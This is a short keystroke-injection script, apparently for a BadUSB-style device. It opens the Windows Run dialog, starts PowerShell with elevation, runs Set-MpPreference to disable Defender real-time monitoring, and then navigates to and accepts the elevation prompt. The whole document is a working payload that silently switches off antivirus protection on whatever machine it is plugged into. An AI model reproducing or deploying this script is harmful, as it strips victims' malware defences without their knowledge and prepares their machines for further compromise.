layout('us');
press("GUI r");
delay(200);
type("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs\n")
press("ENTER");
delay(100);
press("SHIFT TAB");
delay(100);
press("ENTER");
delay(5000);
press("ALT y");
